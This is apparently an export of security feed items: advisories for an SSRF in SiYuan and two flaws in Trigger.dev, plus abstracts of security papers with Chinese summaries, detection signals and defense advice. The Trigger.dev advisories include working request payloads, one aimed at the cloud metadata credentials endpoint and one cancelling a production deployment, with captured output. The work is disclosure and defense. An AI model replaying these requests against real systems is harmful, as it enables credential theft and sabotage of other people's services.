items.title: SiYuan Agent Tools SSRF via DNS-Rebinding TOCTOU (Bypass of CheckHostSSRF)
items.summary:
# Security Advisory — SiYuan Agent Tools SSRF via DNS-Rebinding TOCTOU (Bypass of `CheckHostSSRF`)

| Field | Value |
|---|---|
| **Disclosed by** | joysinleung (`joysinleung@gmail.com`) |
| **Report date** | 2026-08-13 |
| **Product** | SiYuan (思源笔记) — `siyuan-note/siyuan` |
| **Go module** | `github.com/siyuan-note/siyuan/kernel` |
| **Affected versions** | `<= 3.8.0` (latest release at report time; dynamically verified on v3.8.0) |
| **Patched versions** | 3.8.1 |
| **Component** | `kernel/util/httprequest.go` (`CheckHostSSRF`), `kernel/mcp/tools/http_request.go`, `kernel/util/webfetch.go`, `kernel/util/net.go` (`SSRFSafeDialer`) |
| **Relationship to prior advisory** | **Incomplete-fix variant of GHSA-rg26-cg95-gq6p** (SSRF main-vector remediation). See §Relationship. |
| **EPSS (exploitation probability)** | Low–Moderate. Requires the attacker to influence an AI Agent / MCP client into fetching an attacker-controlled domain (prompt-injection scenario documented by the tool itself). |
| **KEV (CISA Known Exploited)** | No (not listed in CISA KEV at report time). |
| **Default-config reachable** | **Yes** — exploitable under *both* `SafeMode` on and off; only requires the agent `http_request` / `web_fetch` tool to be reachable (default AI tooling). |

---

## Summary

SiYuan's AI Agent tools `http_request` (`util.HTTPRequest`) and `web_fetch` (`util.WebFetch`) are the only SSRF gate for outbound requests from the kernel. That gate is `CheckHostSSRF`, which performs a **single DNS resolution at guard time** and checks whether any returned IP is private/loopback/link-local. The actual connection, however, performs a **second, independent DNS resolution** through the default `net.Dialer` — and **no connect-time private-IP check is mounted** on this path.

Because the two resolutions are not pinned to the same result, an attacker-controlled domain can answer the guard-resolution with a **public IP** (passing `CheckHostSSRF`) and the connect-resolution with a **private/loopback/metadata IP** (e.g. `169.254.169.254`). This is a classic **DNS-rebinding TOCTOU** that bypasses the SSRF defense entirely. It reaches cloud instance metadata and internal services that the guard was specifically added to block.

## Relationship to Prior Advisories

- **GHSA-rg26-cg95-gq6p** remediated the SSRF *main vector* by adding `CheckHostSSRF` (parse-time) **and** `SSRFSafeDialer` (connect-time). However, **the agent tool paths (`http_request` / `web_fetch`) only received the parse-time half**: they call `CheckHostSSRF` but then connect via `httpclient.NewBrowserRequest()`, whose transport does **not** mount `SSRFSafeDialer`. Even where `SSRFSafeDialer` *is* mounted, it only blocks private IPs when `SafeMode == true` (default false), so it would not help here regardless. The sibling path `openai.go:generatedImageDialer` *does* mount a connect-time `Control` hook (blocking private/loopback/link-local/100.64/198.18), proving the project knows the technique — the agent path is a clear omission. We report this as an **incomplete-fix variant** with a concrete v3.8.0 reproduction.
- **CVE-2026-32110** (GHSA-56cv-c5p2-j2wg) covered the older `forwardProxy` endpoint and is unrelated to the agent tool path.

## Affected Version

**Dynamically verified on v3.8.0** (tag `v3.8.0`, commit `251596fc0`). A process-level DNS hijack was installed so that the attacker domain `rebind.local` returns a public IP (`203.0.113.1`) on odd (guard) resolutions and `127.0.0.1` on even (connect) resolutions; a loopback "victim" service returned `F9_REBIND_PROOF=reached-internal-only-service-via-TOCTOU`. Both `util.HTTPRequest("GET", "http://rebind.local:<port>/secret")` and `util.WebFetch(...)` returned the internal-only proof body, while `CheckHostSSRF("127.0.0.1")` directly blocked and the legit public domain `pub.local` passed — confirming the guard passed but the connection hit the internal address. All versions `<= 3.8.0` are affected.

items.title: Trigger.dev: Cross-environment deployment cancel
items.summary:
### Summary

Trigger.dev isolates each project into multiple **environments** (`dev`, `staging`, `prod`, and per-PR `preview` branches), each with its **own secret API key** — the environment is a trust boundary (a `dev`/preview/CI key is lower-trust than a `prod` key). Most API routes enforce this by scoping resource lookups to the authenticated key's environment (`where: { friendlyId, runtimeEnvironmentId: auth.environment.id }`).

The deployment **cancel** path does not. `DeploymentService.getDeployment()` scopes the lookup by **`projectId` only** — never `environmentId` — so a secret key for *any* environment in a project can cancel a deployment belonging to *any other* environment of the same project, including **production**. The deployment **GET** route, by contrast, *is* env-scoped — so the same key that is **404'd when trying to read** a prod deployment can nonetheless **cancel** it. That asymmetry is the bug.

### Affected

`apps/webapp`, HEAD `5d99457` (current `main`). Affects self-hosted and cloud.

### Root cause

`apps/webapp/app/routes/api.v1.deployments.$deploymentId.cancel.ts` authenticates to an environment and calls `deploymentService.cancelDeployment(authenticatedEnv, deploymentId, ...)`.

`apps/webapp/app/v3/services/deployment.server.ts`:
```ts
public cancelDeployment(authenticatedEnv: Pick<AuthenticatedEnvironment,"projectId">, friendlyId, ...) {
  return this.getDeployment(authenticatedEnv.projectId, friendlyId)   // projectId only
    .andThen(validateDeployment)                                      // rejects only FINAL statuses
    .andThen(cancelDeployment);                                       // updateMany -> status CANCELED
}
private getDeployment(projectId: string, friendlyId: string) {
  return this._prisma.workerDeployment.findFirst({
    where: { friendlyId, projectId },        // <-- NO environmentId filter
  });
}
```

`cancelDeployment` accepts `authenticatedEnv` but its type is literally `Pick<AuthenticatedEnvironment,"projectId">` — it discards the environment identity. `validateDeployment` blocks only `FINAL_DEPLOYMENT_STATUSES`, so any in-progress deployment (`PENDING`/`INSTALLING`/`BUILDING`/`DEPLOYING`) is cancellable.

**Contrast — the correctly env-scoped sibling** `api.v1.deployments.$deploymentId.ts` (GET):
```ts
const deployment = await prisma.workerDeployment.findFirst({
  where: { friendlyId: deploymentId, environmentId: authenticatedEnv.id },   // env-scoped
});
```
Reads are env-scoped; the cancel mutation is not. The same `getDeployment(authenticatedEnv.projectId, …)` helper also backs the deployment *progress* methods (`deployment.server.ts:172,329`), so the projectId-only scope is a small class.

### Runtime PoC (proven on the self-host stack)

Seeded one project with a `prod` env (key `tr_prod_…`) and a `dev` env (key `tr_dev_…`) and one `WorkerDeployment` (`deployment_pocvictim`, status `DEPLOYING`) in the **prod** env. As the **dev** key:

```
status BEFORE                                                  : DEPLOYING
GET  /api/v1/deployments/deployment_pocvictim   (dev key)      -> 404   (env-scoped read DENIES it)
POST /api/v1/deployments/deployment_pocvictim/cancel (dev key) -> 204
status AFTER                                                   : CANCELED   (prod deploy canceled by the dev key)
CONTROL: same cancel with a DIFFERENT project's key            -> 404   (projectId scope blocks cross-project)
```

The dev key cannot *read* the prod deployment (404) yet *cancels* it (204 → CANCELED); a different project's key is correctly 404'd — so the gap is precisely cross-environment within a project.

items.title: Trigger.dev: Server-side request forgery via unvalidated webhook alert-channel URL
items.summary:
### Summary
A project member can create a webhook alert channel whose delivery URL points at an internal address, and trigger.dev's control plane will send the alert there with no SSRF protection. The webhook URL is stored as an unvalidated string and is fetched directly from the webapp server, so a low-privilege authenticated user can make the server issue POST requests to internal-only services and cloud metadata endpoints (for example http://169.254.169.254/). No private-IP, scheme, or redirect filtering exists anywhere in the webapp.

### Details
The delivery sink performs a raw fetch to the stored URL, apps/webapp/app/v3/services/alerts/deliverAlert.server.ts:949 (#deliverWebhook):
```js
const response = await fetch(webhook.url, {
  method: "POST",
  headers: {
    "content-type": "application/json",
    "x-trigger-signature-hmacsha256": signatureHex,
  },
  body: rawPayload,
  signal: AbortSignal.timeout(5000),
});
```
The same pattern is in apps/webapp/app/v3/services/alerts/deliverErrorGroupAlert.server.ts:245.

The URL is never validated. The stored shape is a bare string, apps/webapp/app/models/projectAlert.server.ts:6:
```js
url: z.string(),     // not even .url()
```
The public API that creates alert channels accepts it with no constraint, apps/webapp/app/presenters/v3/ApiAlertChannelPresenter.server.ts:35:
```js
url: z.string().optional(),
```
and stores it (line 139-142). The dashboard create route applies only `z.string().url()`, which still accepts http://169.254.169.254/... and http://127.0.0.1/.... A repository-wide search for any SSRF guard (private-IP/link-local/loopback/metadata blocklist, DNS-rebinding re-check, request-filtering agent) in apps/webapp returns nothing, so no protection exists at any layer.

Creating the alert channel only requires organization membership (the API path resolves the project via findProjectByRef, which requires `organization.members.some.userId`); no admin role is needed.

### PoC
As any member of an organization (using a personal access token or API key for a project they legitimately belong to):
```http
POST /api/v1/projects/<projectRef>/alertChannels
Authorization: Bearer <token>
Content-Type: application/json

{
  "name": "x",
  "alertTypes": ["task_run_failure"],
  "channel": "webhook",
  "channelData": { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
}
```
Then cause a task run failure in the attacker's own (legitimately owned) environment. DeliverAlert/DeliverErrorGroupAlert fires and the webapp issues a POST to the internal URL, with a valid HMAC signature computed from the channel secret.

Live-validated: a local HTTP server was stood up on 127.0.0.1 to stand in for an internal/metadata endpoint, and the verbatim #deliverWebhook sink (HMAC-sign then raw fetch(webhook.url, POST, body) with no SSRF guard) was executed against it with webhook.url set to that internal address. Captured (what the internal server received):
```
[001 SSRF webhook alert] internal server received: {"url":"/latest/meta-data/","sigHeader":"a1d8dce41bda6c80df5a179cdc9f25320729b991ec3eb5f07df7ab9531149f65","body":"{\"alert\":\"task_run_failure\"}"}
SSRF: CONFIRMED (control-plane POSTed signed payload to internal/metadata URL, no guard)
```
The control plane delivered the signed payload to the internal URL. That a low-privilege org member can create the alert channel (findProjectByRef requires only org membership) is verified at source.

This is a blind/semi-blind SSRF: the response body is not returned to the attacker, but the request reaches the internal service (its POST body is delivered), and status, latency, and error differences are observable through the alert delivery logs/state.

### Impact
A low-privilege authenticated organization member can use the trigger.dev control plane as an SSRF proxy into the internal network and the cloud metadata service. On cloud deployments this can reach the instance metadata endpoint (IMDS) and internal-only admin services. B

items.title: ABSENTIA: Detecting Broken Access Control Vulnerabilities in Web Applications
items.summary: Broken access control, the failure of authorization, is one of the most prevalent web security risks. Unlike injection, a flow of untrusted input into a dangerous operation, authorization is a relation: who may act on what, not how data moves. Each application decides that relation for itself, so no rule written in advance carries to the next. An LLM agent can infer it from the code, but with no systematic way to cover the application and prioritize what to inspect, its search stays undirected and access-control flaws go undetected. We present ABSENTIA, a security scaffolding that turns general LLM agents into systematic vulnerability detectors for the backend of web applications, run as an audit by the developers and security engineers who maintain the code. Under its direction, the agents build a graph that maps the application's routes to the code behind them. ABSENTIA then works route by route, applying invariant falsification: it infers the properties the code is meant to satisfy, and where one is not enforced, reports the route for maintainer review. We also release BAC-Bench, a benchmark of 30 broken access control advisories across 25 repositories, 3 languages, and 9 frameworks, each published in 2025 or later, verified by a human auditor, and paired with its fixing commit, so credit requires flagging the vulnerable version and not the fixed one. ABSENTIA recalls 19 of them, 17 under paired credit, and an LLM verifier confirms 51% of its findings. CodeQL and Semgrep recall none, and an unstructured agent on the same model recalls 3. In the OWASP Benchmark injection categories, ABSENTIA leads the dedicated analyzers in Python and trails only CodeQL and IRIS in Java.

llm_summary.summary_zh: 该论文聚焦“失效的访问控制”(Broken Access Control, BAC) 这一长期位居 OWASP 风险榜前列的 Web 安全问题，指出现有自动化检测手段难以覆盖它的根本原因：与注入类漏洞不同，注入是“不可信数据流入危险操作”的数据流问题，可以用预定规则描述；而授权是一种“关系”——谁可以对什么对象执行什么操作，这条关系由每个应用自行定义，因此不存在可以跨应用迁移的通用规则。LLM 智能体虽然能从源码中推断这种关系，但在缺少系统性覆盖与优先级排序方法的情况下，其搜索是无方向的，导致访问控制缺陷被漏报。为此作者提出 ABSENTIA，一套把通用 LLM 智能体转化为系统性漏洞检测器的“安全脚手架”，定位是由维护代码的开发者与安全工程师执行的例行审计工具。其工作流程分两步：首先由智能体构建一张图，把应用的每个路由映射到其背后的实现代码；随后逐路由执行“不变式伪证”(invariant falsification)，即先推断该路由代码本应满足的授权性质，再检验这些性质是否真正被强制执行，凡是未被强制执行的，就把该路由作为疑似问题提交给维护者人工复核。为量化评估，作者同时发布 BAC-Bench：涵盖 25 个仓库、3 种编程语言、9 种框架的 30 条失效访问控制安全公告，全部发布于 2025 年及之后，经人工审计员核验，并与各自的修复提交配对，因此只有当工具标记出存在漏洞的版本、而非已修复版本时才算命中（配对计分）。实验结果显示，ABSENTIA 召回 30 条中的 19 条，按配对计分口径召回 17 条，LLM 验证器确认其约 51% 的发现为真实问题；作为对比，CodeQL 与 Semgrep 均未召回任何一条，同一底层模型上的非结构化智能体仅召回 3 条。在 OWASP Benchmark 的注入类类别上，ABSENTIA 在 Python 中领先专用分析器，在 Java 中仅落后于 CodeQL 与 IRIS。作者认为，该工作为 LLM 驱动的授权漏洞审计提供了可复现的基线与评估方法。
llm_summary.why_it_matters_zh: 失效访问控制难以用规则化静态分析覆盖，长期是自动化检测的盲区。ABSENTIA 用“路由映射+不变式伪证”把 LLM 智能体变成可审计、可复核的检测流程，并在新发布的 BAC-Bench 上显著超过 CodeQL、Semgrep 与无结构智能体，为蓝队自建授权审计能力提供了可参考的架构与评测指标。
llm_summary.impact_zh: 适用于拥有自研 Web 后端与 API 的企业安全团队：可在代码审计、上线前安全评审、CI 流水线中引入路由级授权不变式检查，作为 SAST/DAST 的补充；BAC-Bench 可作为内部工具选型与回归评测的对照基准，尤其适合对象级授权、横向越权类缺陷的发现。
detection_signals_zh: 同一账号在短时间内访问大量不属于其所属对象的资源标识 (对象级授权缺失的典型日志特征)
路由存在但对应处理器中缺少显式的主体-权限-对象校验路径（代码层面不变式未被强制执行）
权限校验仅停留在角色/菜单层面，而未下沉到具体资源实例
同一模型上非结构化智能体的漏报对比可提示当前扫描覆盖不足
业务日志中出现越权成功响应 (2xx) 而预期应为 403/404 的访问记录
defense_advice_zh: 建立路由到实现代码的完整映射清单，确保每个入口点都在审计范围内，避免覆盖盲区
对每条路由显式声明其应满足的授权不变式（主体、操作、对象范围），并在代码评审中验证是否被强制执行
将 LLM 生成的发现视为待复核线索而非结论，配置人工确认环节，并评估其误报率（论文报告的验证通过率约 51%）
为对象级授权与横向越权补充针对性的回归测试用例，与漏洞修复提交形成配对回归
在 CI 中同时运行传统 SAST 与基于智能体的授权审计，利用二者互补性弥补规则化工具在授权类缺陷上的召回空白

items.title: PassGPT+: Leveraging Linguistic Priors for Password Modeling
items.summary: Passwords remain the dominant online authentication mechanism, and understanding how humans choose them is essential for defensive strength estimation and attack simulation alike. Recent learning-based approaches such as PassGAN and PassGPT have shown that deep generative models can learn password structure directly from leaked corpora. However, both train from random initialization on password data alone. The role of linguistic prior knowledge in password modeling, and what it reveals about how humans create secrets, remains largely underexplored. Here, we address this gap with PassGPT+, which adapts the linguistic prior of GPT-2 to password observations through character-aware tokenization. We also introduce PassDiffusion, the first absorbing-state discrete diffusion model for password generation, as a probe of whether non-autoregressive approaches are competitive. On the RockYou benchmark, PassGPT+ recovers 22.53% of held-out passwords at 108 guesses, a 16% relative gain over PassGPT, and retains 79% of this match rate when transferred without retraining to a disjoint 2020 leak dataset, demonstrating that linguistic priors capture persistent regularities of human password generation. PassDiffusion underperforms by two to three orders of magnitude, indicating that autoregressive modeling is substantially better matched than iterative denoising to the discrete, exact-match nature of password generation.

llm_summary.summary_zh: 该论文关注的核心问题是：在大规模口令泄露语料上训练生成式模型时，引入自然语言的先验知识是否能更准确地刻画人类构造口令的规律，以及自回归与非自回归（扩散）两类生成范式在口令建模任务上的适配性差异。作者指出现有工作 PassGAN、PassGPT 等都是完全从随机初始化开始、仅依赖口令数据训练，语言先验这一维度的价值尚未被系统探索。为此，论文提出 PassGPT+：以预训练语言模型 GPT-2 为起点，通过字符级（character-aware）的分词与适配方案，把自然语言建模能力迁移到口令字符串上，使模型能够利用字符组合、可发音性、常见词根与词形变化等语言学规律。同时，作者提出 PassDiffusion，这是首个面向口令生成的吸收态离散扩散模型（absorbing-state discrete diffusion），用于检验非自回归生成路线是否具备竞争力。实验在 RockYou 基准上进行：PassGPT+ 在 108 次猜测预算下恢复出 22.53% 的留出口令，相对 PassGPT 提升约 16%；更重要的是，将模型不做任何再训练直接迁移到一份互不相交的 2020 年泄露数据集时，仍保留约 79% 的命中率，说明语言先验捕获的是人类生成口令中具有持久性的规律，而非特定数据集的记忆。相比之下，PassDiffusion 的表现落后两到三个数量级，作者据此认为，口令生成本质上是离散的、以精确匹配为目标的序列任务，自回归建模比迭代去噪更契合。该工作适合口令安全、认证协议、生成式建模与 AI 安全交叉方向的研究者与防御工程师阅读。
llm_summary.why_it_matters_zh: 口令猜测能力直接决定防御方强度评估的可信度。该研究表明语言先验可显著提升口令猜测命中率且能跨数据集迁移，意味着仅靠传统规则或纯口令语料训练模型评估出的口令强度可能被系统性高估，企业口令策略与强度评估工具需要纳入此类模型进行对抗性复核。
llm_summary.impact_zh: 可迁移到口令强度评估器与口令策略制定流程、泄露口令语料的再分析、认证系统的在线猜测风险建模，以及任何需要评估“人类生成秘密”可预测性的场景（如 PIN、恢复短语、安全问题答案）。
detection_signals_zh: 认证日志中单一来源或分布式来源在短猜测预算（数十至数百次）内的高命中率尝试序列
登录失败尝试中口令候选呈现语言化特征（真实词根、词形变化、可发音结构）而非随机字符的占比上升
同一账号或同一口令哈希在多个互不相干泄露数据集中的复用命中，可作为口令重用风险的监控指标
口令重置/注册接口的口令分布与已知泄露语料高度重合的统计偏移
defense_advice_zh: 在内部口令强度评估中引入基于语言先验的生成式猜测基线，与现有规则引擎结果对比，量化策略被高估的程度
对在线认证实施严格的速率限制、指数退避与异常来源聚合封锁，压缩低猜测预算下的成功率空间
强制或优先推广多因素认证，降低口令被正确猜中后的实际危害
禁止或限制口令在多个系统间复用，并对已出现在公开泄露语料中的口令进行注册/改密拦截
对高价值账号采用更长的口令长度下限与更强的熵要求，避免依赖易被语言模型覆盖的常见词形结构

items.title: SafeDepth: Safety-Aware Token-Level Adaptive Computation
items.summary: Recent studies suggest that not every token needs to pass through all Transformer layers, motivating token-level adaptive models that selectively skip layers to reduce computation. Our experiments show that these execution choices also affect safety: existing token-level adaptive reasoning models exhibit higher harmful-response rates than their reference backbones. The safety effects depend on which layers are skipped and whether skipping occurs during prompt processing or answer generation. We further find that recognizing harmful requests and producing refusals depend on different layer-wise computations. We introduce SafeDepth, a lightweight, plug-in framework that uses selective layer execution to improve both safety and efficiency. SafeDepth learns to retain computations that support safe responses and bypass those that contribute to unsafe generation. A router selects layer execution based on token representations, layer position, and inference phase, while an adapter supports the skipped paths. We jointly train these modules to reduce computation and harmful responses while preserving performance on benign tasks, targeting a better safety-efficiency trade-off. The pretrained backbone remains frozen throughout, requiring no additional pretraining. Experimental results on Llama-3-8B-Instruct show that SafeDepth reduces computation relative to full-depth inference while largely preserving task performance. Compared with FlexiDepth, it lowers unsafe-response rates across all five harmful-request benchmarks, with the largest absolute decrease on HarmBench-HJ (from 55.44% to 25.25%), while reducing the XSTest false-refusal rate from 12.0% to 4.0%.

llm_summary.summary_zh: 该论文研究的是大模型推理效率优化与安全对齐之间的冲突问题。近年来出现的一类令牌级自适应（token-level adaptive）Transformer 模型认为并非每个 token 都需要经过全部层，于是按 token 选择性地跳过部分层以减少计算量。作者通过实验发现，这类执行路径的选择会显著影响模型安全性：现有的令牌级自适应推理模型相比其原始骨干网络，会产生更高比例的有害回答；而且安全影响具体取决于被跳过的是哪些层，以及跳过发生在提示处理阶段还是答案生成阶段。作者进一步揭示，识别有害请求与生成拒答这两种能力依赖于不同层次的逐层计算，因此不能用同一种跳层策略一概而论。基于此，作者提出 SafeDepth——一个轻量、插件式的框架，通过有选择的层执行同时改善安全性与效率。SafeDepth 学习保留支撑安全回答的计算、绕过会助长不安全生成的计算；其中路由器（router）依据 token 表示、层位置和推理阶段（提示处理 vs 生成）决定是否执行某层，适配器（adapter）则补偿被跳过路径的功能。这些模块被联合训练，目标是在不损害良性任务表现的前提下同时降低计算量与有害回答率，从而取得更优的安全—效率权衡。整个预训练骨干网络保持冻结，不需要额外预训练。在 Llama-3-8B-Instruct 上的实验表明：相对全深度推理，SafeDepth 降低了计算量且基本保持任务性能；与 FlexiDepth 相比，它在全部五个有害请求基准上都降低了不安全回答率，其中 HarmBench-HJ 上的绝对降幅最大（从 55.44% 降至 25.25%），同时把 XSTest 的误拒率从 12.0% 降到 4.0%。该工作适合关注推理加速、模型对齐与红队评测的安全研究者和工程团队阅读。
llm_summary.why_it_matters_zh: 推理加速与安全对齐常被当作两件事分开处理，本文证明令牌级跳层这类效率优化会直接抬升有害输出率，并给出可插拔的缓解方案，对采用自适应推理/稀疏计算的部署方具有直接参考价值。
llm_summary.impact_zh: 影响所有使用层跳过、早退、MoE 式稀疏路由或投机解码等推理优化的 LLM 服务；可迁移到推理网关、模型托管平台的安全回归测试与加速方案选型评估。
detection_signals_zh: 推理服务中逐层/逐 token 的执行路径与跳过率统计出现异常分布
启用或调整加速/跳层策略后，有害请求基准的拒答率与误拒率同时发生偏移
同一模型在不同推理阶段（提示处理 vs 生成）的层激活模式差异过大
路由模块决策日志中出现与安全相关层被系统性绕过的模式
defense_advice_zh: 在引入任何层跳过或自适应计算优化前，对有害请求基准与误拒基准做双向回归测试
为路由/跳层决策保留可审计日志，并按推理阶段分别监控安全指标
优先保留对拒绝行为关键的层计算，对可能助长不安全生成的路径做抑制
将安全—效率权衡指标纳入模型上线前的准入评估，而非仅看延迟与吞吐
llm_summary.recommended_action_zh: 研究跟进

items.title: Helol Tunnel: Covert Channel Exploitation of TLS Extensibility & Privacy Features
items.summary: Covert channels exploiting network protocols for data exfiltration and command-and-control (C2) are integral parts of modern cyberattacks. In search of a significant covert channel within the fabric of the Internet, we targeted the combinatorial properties of the Client Hello (CHLO) packets in the ubiquitous Transport Layer Security (TLS) protocol. The proposed Helol tunnel is a novel covert approach to embedding information in TLS Client Hello packets, which involves the strategic rearrangement of their cryptographic information elements. To sustain TLS protocol extensibility, the recent anti-ossification TLS compliance measures encourage the interactive middleboxes and next-generation firewalls (NGFWs) to preserve the parameter configuration in the Client Hello packets. Furthermore, to improve user privacy, popular Internet applications are varying their TLS CHLO parameter configurations to resist TLS fingerprinting by third-party network entities. We demonstrate the strength of the Helol tunnel to exploit these recent developments to evade NGFWs with interactive proxy and comprehensive threat protection. We also numerically show the efficacy of Helol tunneling over state-of-the-art covert channels that exploit TLS through the use of real traffic captures and public TLS fingerprinting data.

llm_summary.summary_zh: 该论文研究的是如何利用 TLS 协议本身的可扩展性与隐私特性构建隐蔽信道（covert channel），用于数据外泄和命令控制（C2）通信。作者指出，现代网络攻击普遍依赖网络协议中的隐蔽通道，而 TLS 作为互联网上最普遍的加密握手协议，其 Client Hello（CHLO）报文蕴含大量可由攻击者控制的"组合自由度"。论文提出的 Helol Tunnel 的核心思路是：通过策略性地重排 Client Hello 中的密码学信息元素（例如扩展项、密码套件等的排列组合方式），把比特信息编码进这些"顺序/组合"维度，从而在不改变 TLS 协议语法合法性、不触发解密告警的前提下承载隐蔽数据。之所以在当前时点可行，作者给出两点现实驱动因素：其一，近年为对抗协议僵化（ossification），TLS 合规性要求鼓励交互式中间盒和下一代防火墙（NGFW）在转发时保留 Client Hello 的参数配置，不得随意改写，这为攻击者保留了可用于编码的"自由度"；其二，为提升用户隐私、抵抗第三方网络实体的 TLS 指纹识别，主流互联网应用大量随机化、多样化其 Client Hello 参数配置，使得"每个连接指纹都不一样"变成正常现象，从而为隐蔽通道提供了天然的掩护。作者通过实验证明 Helol Tunnel 能够绕过具备交互式代理与完整威胁防护能力的 NGFW，并使用真实流量抓包与公开 TLS 指纹数据，与现有利用 TLS 的先进隐蔽信道方案进行数值化对比，表明其效率更具优势。论文视角属于研究问题+核心方法+贡献型：它揭示的并非某个具体软件漏洞，而是 TLS 在设计层面为兼容性与隐私所做的让步，被反向利用形成可规避检测的传输信道，对网络监测与流量分析构成结构性挑战。
llm_summary.why_it_matters_zh: 它说明防御方长期依赖的 TLS 指纹与 Client Hello 字段正被当作隐蔽信道，且抗僵化合规与隐私随机化两大趋势反而为规避 NGFW 提供了掩护，意味着基于固定指纹的检测与阻断策略可能出现系统性盲区。
llm_summary.impact_zh: 影响面覆盖 NGFW/IPS/交互式代理、TLS 检测与指纹识别（JA3/JA4 类方案）、DLP 与外泄监测、C2 检测等场景。凡是把 Client Hello 参数顺序或指纹当作稳定特征来做策略匹配的环节，都可能被此类组合编码绕过；同时大批量合法应用的指纹随机化会淹没基于指纹异常的小信号，需要迁移到统计与行为维度的检测思路。
detection_signals_zh: 同一主机/应用在短时间内 Client Hello 的扩展项与密码套件顺序出现高频、非自然抖动，偏离其历史基线指纹
Client Hello 指纹与所声称的操作系统、客户端软件或 TLS 库不匹配（如 SNI、ALPN、版本组合矛盾）
同一 JA3/JA4 指纹对应的握手后流量模式异常，或同一目标在指纹高度相似的情况下流量内容特征差异显著
长连接、周期性小流量会话反复出现"可编码空间被填满"式的顺序变化（组合/排列熵异常）
对同一目的地的连接在保持参数集合不变的前提下顺序持续变化，疑似以顺序差承载信息
NGFW/代理日志中出现参数被保留但排列异常、与合规转发策略不一致的 Client Hello 记录
defense_advice_zh: 将检测重心从单一静态指纹逐步迁移到指纹时序与统计特征：建立每主机、每应用的 Client Hello 参数顺序基线，对顺序抖动的频率和熵做告警而非只做黑名单匹配
在具备解密能力的边界设备上，对高价值目标做受控 TLS 检查；对无法解密的环境，强化对流量大小、方向、时序与目的信誉的关联分析
维护内部 JA3/JA4 指纹清单并标注哪些客户端属于"天然随机化"（浏览器、移动应用），避免把正常隐私行为误判为隐蔽通道
对同一凭证或主机同时出现「指纹多样化」与「到可疑 IP 的规律性小流量连接」的组合信号提升告警等级
评估现有 NGFW/代理在抗僵化合规要求下保留 Client Hello 的取舍，明确保留字段范围是否被用于隐蔽侧信道，并纳入变更评审
把此类信道纳入红蓝对抗与检测规则回归测试，验证现有策略对顺序编码类隐蔽通道的发现能力
llm_summary.recommended_action_zh: 研究跟进，并纳入内部 TLS 检测能力评估与红蓝对抗验证

items.title: Learning Normal Diffusion Dynamics for Backdoor Defense in Text-to-Image Models
items.summary: Backdoor attacks pose a serious threat to the secure deployment of text-to-image (T2I) diffusion models. Existing defenses typically detect backdoors from specific abnormal patterns in internal representations, which may limit their generalizability with the emergence of increasingly diverse attack mechanisms. In this paper, we study backdoor defense of T2I diffusion models from a transition-dynamics perspective. We observe that benign diffusion trajectories exhibit structured and timestep-dependent transition patterns from cross-attention, latent and noise spaces, whereas backdoor attacks tend to induce deviations from such normal evolution. Motivated by these observations, we propose Normal Diffusion Dynamics Learning (NDDL), a novel backdoor defense framework that learns the normal transition dynamics of diffusion trajectories utilizing only benign samples. NDDL constructs compact multi-space trajectory representations and trains a timestep-conditioned dynamics model to predict the diffusion evolution. In the inference phase, deviations between the observed and predicted transitions are exploited to quantify dynamics inconsistency for backdoor detection. NDDL further enables trigger localization without any prior knowledge of the embedded backdoor by performing substitution with low-semantic words. Extensive experiments for diverse backdoor attacks demonstrate the effectiveness and generalizability of our proposed NDDL.

llm_summary.summary_zh: 该论文关注文生图（Text-to-Image, T2I）扩散模型面临的后门攻击威胁：攻击者通过在训练数据中植入带触发器的样本，使模型在特定触发条件下输出被操控的图像，而正常输入下行为依旧正常，因此难以察觉。作者指出，现有防御方法多依赖内部表征中某些固定的异常模式（如特定注意力头、特定 latent 特征分布或噪声模式）来检测后门，这类方法高度依赖对已知攻击机制的先验假设，当攻击手段不断翻新、触发方式更加隐蔽时，其泛化能力会显著下降。为突破这一局限，论文改从“转移动力学”视角研究后门防御：作者观察到，良性扩散轨迹在跨注意力空间、潜空间与噪声空间中呈现出结构化且与时间步（timestep）强相关的演化规律，而后门攻击会破坏这种正常演化，导致轨迹在特定时间步出现偏离。基于这一观察，论文提出 NDDL（Normal Diffusion Dynamics Learning，正常扩散动力学学习）框架，其核心思想是仅使用良性样本学习“正常”的扩散演化规律。具体而言，NDDL 首先构建紧凑的多空间轨迹表示，将跨注意力、潜空间与噪声空间的演化信息压缩为可比较的表征；随后训练一个以时间步为条件的动力学模型，用于预测扩散过程在给定时刻应有的下一步转移。推理阶段，通过比较观测到的真实转移与模型预测的转移之间的偏差，量化“动力学不一致性”，并将其作为后门检测判据——偏离越显著越可能是被触发样本。此外，NDDL 无需任何关于所植入后门的先验知识，即可借助低语义词汇替换（substitution with low-semantic words）实现触发器定位，从而提示触发词可能出现在提示词的哪个位置。论文在多种后门攻击设置下进行了大量实验，结果表明 NDDL 在检测有效性与跨攻击泛化性方面均表现良好。该方法的价值在于把后门防御从“匹配已知异常特征”转向“建模正常行为基线”，属于典型的异常检测式思路，对应对未知攻击变体具有参考意义。
llm_summary.why_it_matters_zh: 扩散模型已被广泛集成到图像生成产品与设计流程中，后门一旦被触发可导致品牌风险、内容安全事故与合规问题。该工作提出只用良性样本建模正常扩散动力学来检测后门，不依赖特定攻击特征，对未知变体的泛化性更契合企业实际防御需求，并给出触发器定位思路，便于溯源。
llm_summary.impact_zh: 可迁移至任何基于扩散架构的生成式模型安全评测与上线前检测流程，包括自研 T2I 模型、第三方开源模型（如 Stable Diffusion 系列）的供应链审核，以及模型托管平台的内容安全风控；其“正常轨迹建模 + 偏差打分”范式也可借鉴到其他序列化生成模型的后门与异常检测场景。
detection_signals_zh: 推理阶段观测转移与时间步条件动力学模型预测转移之间的偏差（多空间轨迹不一致性）显著升高
跨注意力空间、潜空间与噪声空间中扩散轨迹的演化模式偏离良性基线，尤其在特定时间步出现突变
对提示词中低语义词汇（虚词、无意义修饰词）做替换后生成结果发生语义无关的显著变化，提示可能存在触发器
同一提示词在不同时间步上的转移偏差分布呈现非正常聚集，可作为批量筛查的打分特征
defense_advice_zh: 在模型上线前的安全评估中引入“良性基线动力学建模”环节，仅用可信数据拟合正常扩散演化规律，作为异常打分参考
对可疑样本按动力学不一致性排序并设置分级阈值，高分段优先人工复核，降低误报带来的运营成本
结合低语义词汇替换做触发器定位，对定位结果进行溯源分析，回溯训练数据与微调数据集中的可疑样本
将该类检测逻辑作为多层防御的一环，与数据清洗、模型微调审计、生成内容审核与输出水印等手段并联使用
关注该方法的计算开销与推理延迟，评估其是否适合在线逐请求检测，或仅用于离线批量扫描
